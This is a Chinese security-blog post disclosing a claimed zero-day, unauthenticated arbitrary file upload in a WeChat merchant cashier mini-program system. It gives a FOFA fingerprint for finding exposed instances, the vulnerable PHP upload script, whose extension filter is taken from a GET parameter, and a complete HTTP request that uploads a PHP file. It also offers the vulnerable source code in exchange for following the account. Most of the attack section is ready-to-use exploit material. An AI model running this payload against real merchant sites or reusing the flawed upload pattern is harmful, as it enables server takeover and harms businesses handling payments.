#  (0day)微信公众号商家收银台小程序系统存在前台任意文件上传漏洞   
原创 Mstir  星悦安全   2024-11-15 04:00  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字关注我们 并设为  
星标  
## 0x00 前言  
  
**微信公众号程序，必须微信认证服务号，微信支付商家**  
  
**客户扫码，打开商家定义支付页面，输入金额和对应定义信息，提交微信支付，实现快速付款**  
  
**支持创建多个店铺，各个店铺自定义不同自定义表单。通过自定义表单实现订单自定义明细**  
  
**通过店铺自定义表单可以轻松建立，快捷收款、微信收银台、面对面收款、商品预约预订等扫码微信支付， 提升客户服务体验，商户快速获得精准订单数据，实现账款统计。**  
  
**通过打开自定义的表单页面，输入自定义的指定信息，可以实现订单收款。**  
  
**完全可自定义的表单字段，支持单行文本，多行文本，单选，多选，下拉选择，上传图片，时间。**  
  
**Fofa指纹:"/index.php?s=platform/index/captcha"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fr0w5NqA8l0xH4mcpTbkGK0szDic8fhdBYZG6TibVicicgIetibblicY29d5RRAfgXiaP2SZeibYxFmaLjcg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fr0w5NqA8l0xH4mcpTbkGKJhib0QiasRZUpQ803gWXKKuWxFIvGzWAUibb2By0ykNnmwiboKzZBtXictQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fr0w5NqA8l0xH4mcpTbkGK5Mrao8VJcOicQAy2ybNHz1KMP9Vws3vOic4gpuCaQI9LPEBoOKHY409g/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 0x01 漏洞分析&复现  
  
**位于 /library/deep/upload.iframe.php 文件中存在move_uploaded_file 函数上传文件，且过滤文件类型可通过GET传入FileType来自定义，导致漏洞产生.**  
```
<?php
  /*
$_FILES["uploadFileName"]["name"] - 被上传文件的名称 
$_FILES["uploadFileName"]["type"] - 被上传文件的类型 
$_FILES["uploadFileName"]["size"] - 被上传文件的大小，以字节计 
$_FILES["uploadFileName"]["tmp_name"] - 存储在服务器的文件的临时副本的名称 
$_FILES["uploadFileName"]["error"] - 由文件上传导致的错误代码 
*/
  //设置上传文件尺寸  例如：最大为500K 输入 500
  $MaxSize=$_GET["MaxSize"] ;//*1024
//设置文件限制格式 允许的附件类型 例如：gif/jpg/rar/zip
$FileType=$_GET["FileType"];
//设置文件的保存路径，
$savePath=$_GET["savePath"];
//返回到表单的值 例如：form1.fProducts_Pic
$backIdName=$_GET["backIdName"];
//定义上传后的文件名  0：自动取无重复的服务器时间字符串为文件名  '1：自动取源文件名  '字符串：自定义的文件名，如"mypic.jpg"
$saveName=$_GET["saveName"];
if(empty($saveName)){ $saveName=0; }

if( isset($_GET["action"])&&"add"==$_GET["action"] )
{
  //检查目录是否存在-----------
  if(file_exists('../../data/uploadfile')==false){
    mkdir('../../data/uploadfile' , 0755, true );
  }
  if(file_exists('../../data/uploadfile/'.$savePath)==false){
    mkdir('../../data/uploadfile/'.$savePath , 0755, true );
  }

  if ($_FILES["uploadFileName"]["error"] > 0)
  {
    echo "Error: " . $_FILES["uploadFileName"]["error"] . "<br />";
  }else{

    if( stripos( $FileType, get_file_extension($_FILES["uploadFileName"]["name"] ) )!==false ){
      $upload_file_name=upload_file_savename($_FILES["uploadFileName"]["name"],$saveName);
      move_uploaded_file($_FILES["uploadFileName"]["tmp_name"], '../../data/uploadfile/'.$savePath .'/'.$upload_file_name);//保存被上传的文件
      echo 'ok ';
      echo "上传成功,文件地址：<span style='color:#00f'>".'data/uploadfile/'.$savePath.'/'.$upload_file_name."</span><br><br>";
      ?>
      <script type='text/javascript'>
        window.onload=function(){
          var parentBackId=parent.document.getElementById('<?php echo $backIdName?>');
          parentBackId.value='<?php echo 'data/uploadfile/'.$savePath.'/'.$upload_file_name?>';
        }
      </script>
      <?php
    }else{
      echo '上传失败，请检查文件类型';
    }
  }
}
function upload_file_savename($upload_file_name,$save_name=0){
  $str_file_ext= get_file_extension($upload_file_name);  //得到扩展名
  $str_file_name='';
  switch($save_name){
    case '0':  
    $str_file_name=date('YmdHis').mt_rand(100,999);
    $save_name= $str_file_name.'.'.$str_file_ext;
    break;
    case '1':
    $save_name= $upload_file_name;
    break;
    default:
    $save_name=$save_name.'.'.$str_file_ext;
  }
  return $save_name;
}

//得到文件扩展名
function get_file_extension($file_name){
  $path_parts = pathinfo($file_name);
  return $path_parts["extension"];
}
?>
```  
  
**Payload:**  
```
POST /library/deep/upload.iframe.php?action=add&MaxSize=&FileType=php&savePath=&backIdName=&saveName=0 HTTP/1.1
Host: 127.0.0.1
Content-Length: 208
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywb0ftWeTnkfnoTM2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarywb0ftWeTnkfnoTM2
Content-Disposition: form-data; name="uploadFileName"; filename="666.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundarywb0ftWeTnkfnoTM2--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fZ0ljsjVWWlfO36ic1fT8ibV9b0IO28nDoZ59zJEpOQTibUBoWBCV444rYicknxqzKW5yWUKDI7YvxPQ/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fZ0ljsjVWWlfO36ic1fT8ibVrTciagdcT0TO3Oob7OqwllGa1B2ia3CVTR91aLXHNegNT9YgR9QwMVEw/640?wx_fmt=other&from=appmsg "")  
## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**收银台源码关注公众号发送 241114 获取!**  
  
  
  
  
**进星悦安全公开群添加下方VX 备注 "进群"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fr0w5NqA8l0xH4mcpTbkGK5v6wyHcicibH4ia14Wq1n0fPvn1C0QPAe98oVABtMWOA8nRPfHia0YqAFw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
